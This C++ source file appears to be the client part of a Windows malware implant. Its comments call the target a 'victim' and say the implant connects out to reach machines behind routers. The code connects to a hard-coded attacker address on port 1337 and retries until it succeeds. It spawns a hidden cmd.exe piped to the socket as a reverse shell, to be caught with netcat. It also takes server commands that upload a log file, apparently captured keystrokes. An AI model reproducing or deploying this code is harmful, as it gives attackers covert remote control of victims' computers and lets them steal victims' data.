#pragma once
#include "stdafx.h"
#include <string>
#include <fstream>
#include <iostream>
#include "Client.h"
using namespace std;
/*
This class is used to establish a connection
to our server to upload/download data and receive
commands. We want the client to connect to us instead
of us connecting to them in order to connect to computers
behind routers. This way we don't need to worry about
forwarding any ports on the "victim's" end.
*/

Client::Client(void)
{
	PCSTR host = "192.168.1.89"; //Adress to server
	PCSTR port = "1337";         // Port server is listening on  
	WSADATA wsaData;
	connectSocket = INVALID_SOCKET;
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	iResult = getaddrinfo(host, port, &hints, &result);
	for(ptr=result; ptr != NULL; ptr=ptr->ai_next)
	{
		connectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		//If server is down attempt reconnect every 5 seconds
		iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if(iResult == SOCKET_ERROR)
		{
			while(iResult == SOCKET_ERROR)
			{
				printf("The server is down. Attempting reconnect in 5 seconds...\n");
				Sleep(5000);
				iResult = connect(connectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			}
		}
		this->startrshell();		
	}
}

//Creates a remote shell on the target's machine
//Use netcat to start listening on port 1337
//for dll to connect (reverse connecting)
void Client::startrshell(){
	HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
   SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, true};
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   DWORD stuff;
   //...I'll add proper array size eventually instead of sending 5000 bytes everytime
   char buff[5000], recvBuff[5000];
   bool firstsend;
   int offset = 0, bRecv;
   if(send(connectSocket, "Lets chat\n", sizeof("Lets chat\n"), 0) == SOCKET_ERROR) goto closeSck;
   if(!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
       send(connectSocket, "Error Creating Pipes For Remote Shell\r\nClosing Connection...", 60, 0);
       goto closeSck;
   }
   GetStartupInfo(&si);
   si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
   si.wShowWindow = SW_HIDE;
   si.hStdOutput = stdoutWr;
   si.hStdError = stdoutWr;                                                                                              
   si.hStdInput = stdinRd;
   WCHAR lpath[] = L"cmd.exe";
   if(!CreateProcess(NULL, lpath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
       send(connectSocket, "Error Spawning Command Prompt. \r\nClosing Connection...", 52, 0);
       goto closeSck;
   }
   while(1)
   {
       Sleep(100);
       GetExitCodeProcess(pi.hProcess, &stuff);
       if(stuff != STILL_ACTIVE) break;
       PeekNamedPipe(stdoutRd, NULL, 0, NULL, &stuff, NULL);
       if(stuff != 0)
       {
       ZeroMemory(buff, sizeof(buff));
	   ZeroMemory(recvBuff, sizeof(recvBuff));
       firstsend = true;
       do {
               ReadFile(stdoutRd, buff, 5000, &stuff, NULL);
			   buff[1000] = '\0';
               if(firstsend)
               {
               send(connectSocket, buff, strlen(buff), 0);
               firstsend = false;
               }
               else send(connectSocket, buff, strlen(buff), 0);
          } while(stuff == 5000);
       }
        
       if(!strcmp(recvBuff, "\r\n")) offset = 0;
       bRecv = recv(connectSocket, recvBuff, 5000, 0);
       if((bRecv == 0) || (bRecv == SOCKET_ERROR)) break;
       recvBuff[bRecv] = '\0';
       WriteFile(stdinWr, recvBuff, strlen(recvBuff), &stuff, NULL);
   }
   closeSck:
       TerminateProcess(pi.hProcess, 0);
       CloseHandle(stdinRd);
       CloseHandle(stdinWr);
       CloseHandle(stdoutRd);
       CloseHandle(stdoutWr);
       closesocket(connectSocket);
}

//Listens for commands from server in a while loop
//on a sperate thread created by main.cpp.
//NOTE: This is only used with your own server
//      instead of netcat
void Listen(SOCKET csock)
{
	//Commands
	string COMMAND_TESTBACK = "testback";
	string COMMAND_GETLOG = "getlog";
	string input;
	char recvbuf[1024];
	int bytes;
	while(1)
	{
		bytes = recv(csock, recvbuf, 1024, 0);
		if(bytes > 0)
		{
			//cout << recvbuf;        //For debugging only
			//cout << bytes << "\n";  //For debugging only
			input = string(recvbuf);
			for(int i = 0; i < 1024; i++)
			{
				recvbuf[i] = 0;
			}
		}
		if (input == COMMAND_TESTBACK)
		{
			SendTestMesg(csock);
		}
		else if(input == COMMAND_GETLOG)
		{
			UploadLog(csock);
		}
	}
}

//Used with Listen() to upload log
//to server
void UploadLog(SOCKET csock)
{
	const int packet_size = 1024;
	string line;
	ifstream file ("log.txt");
	if(file.is_open())
	{
		while(getline(file, line))
		{
			cout << line << '\n';
		}
		file.close();
	} else cout << "Unable to open file";
	char packet_data[packet_size];
	strcpy_s(packet_data, line.c_str());
	send(csock, packet_data, sizeof(packet_data), 0);
	closesocket(csock);
}

//Sends test message to test connection
void SendTestMesg(SOCKET csock)
{
	int ret;
	char sendBuf[] = "Test message.\n";
	ret = send(csock, sendBuf, (int)strlen(sendBuf), 0);
	if(ret == SOCKET_ERROR)
	{
		printf("Send failed: %d\n", WSAGetLastError());
		closesocket(csock);
		WSACleanup();
		exit(1);
	}
	printf("Bytes sent :%ld\n", ret);
}

Client::~Client()
{

}
